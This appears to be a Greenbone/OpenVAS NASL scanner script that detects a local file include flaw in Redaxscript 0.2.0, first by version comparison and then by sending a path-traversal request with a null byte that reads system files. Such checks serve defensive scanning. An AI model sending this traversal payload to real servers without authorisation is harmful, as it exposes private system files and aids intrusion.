CPE = "cpe:/a:redaxscript:redaxscript";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100122" );
	script_version( "2021-05-18T07:19:12+0000" );
	script_tag( name: "last_modification", value: "2021-05-18 07:19:12 +0000 (Tue, 18 May 2021)" );
	script_tag( name: "creation_date", value: "2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)" );
	script_bugtraq_id( 34476 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Redaxscript 'language' Parameter Local File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "redaxscript_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "redaxscript/detected" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/34476" );
	script_tag( name: "summary", value: "Redaxscript is prone to a local file include vulnerability
  because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process. This may aid in further attacks." );
	script_tag( name: "affected", value: "Redaxscript 0.2.0 is vulnerable. Other versions may also be
  affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vers = infos["version"];
dir = infos["location"];
if( vers && vers != "unknown" ){
	if(version_is_equal( version: vers, test_version: "0.2.0" )){
		report = report_fixed_ver( installed_version: vers, fixed_version: "None", install_path: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
else {
	if(!dir){
		exit( 0 );
	}
	if(dir == "/"){
		dir = "";
	}
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/index.php?language=../../../../../../../../", file, "%00" );
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( url: url, port: port );
			security_message( port: port, data: url );
			exit( 0 );
		}
	}
}
exit( 99 );

